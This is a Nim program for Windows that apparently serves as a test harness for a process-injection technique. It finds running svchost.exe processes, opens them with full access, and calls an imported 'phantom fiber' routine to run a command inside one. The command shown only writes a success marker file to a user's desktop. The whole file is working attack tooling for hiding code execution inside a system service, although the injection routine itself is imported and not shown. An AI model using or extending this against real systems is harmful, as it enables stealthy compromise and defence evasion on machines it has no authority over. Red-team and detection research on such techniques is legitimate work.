import winim, strutils, os
import ../kct/kct_core, ../kct/phantom_fiber_v4

proc find_pid(name: string): seq[DWORD] =
    var pids: seq[DWORD] = @[]
    var hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if hSnapshot == INVALID_HANDLE_VALUE: return pids
    var pe: PROCESSENTRY32
    pe.dwSize = sizeof(PROCESSENTRY32).DWORD
    if Process32First(hSnapshot, addr pe) != 0:
        while true:
            var exeName = ""
            for x in pe.szExeFile: exeName.add(if x != 0: char(x) else: '\0')
            exeName = exeName.strip(chars={'\0'})
            if exeName.toLowerAscii() == name.toLowerAscii():
                pids.add(pe.th32ProcessID)
            if Process32Next(hSnapshot, addr pe) == 0: break
    CloseHandle(hSnapshot)
    return pids

proc main() =
    let processName = "svchost.exe"
    echo "Finding PIDs for ", processName, "..."
    let pids = find_pid(processName)
    if pids.len == 0:
        echo "Failed to find any PID for ", processName
        return

    echo "Found ", pids.len, " instances of ", processName

    let cmd = "cmd.exe /c echo KCT HIJACK SVCHOST SUCCESS > C:\\Users\\Doheon\\Desktop\\kct_svchost_success.txt"
    var injected = false

    for pid in pids:
        echo "Targeting ", processName, " (PID: ", pid, ")"
        let hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid)
        if hProcess == 0:
            echo "  OpenProcess failed (Access Denied / Insufficient Privileges)"
            continue
        
        echo "  Injecting..."
        if inject_phantom_fiber_v4(hProcess, 2, cmd):
            echo "  Injection payload deployed to SVCHOST! It will trigger if svchost processes window messages."
            injected = true
            CloseHandle(hProcess)
            break
        else:
            echo "  Injection failed."
        CloseHandle(hProcess)

    if injected:
        sleep(5000)
    else:
        echo "Failed to inject into any svchost.exe process."

main()
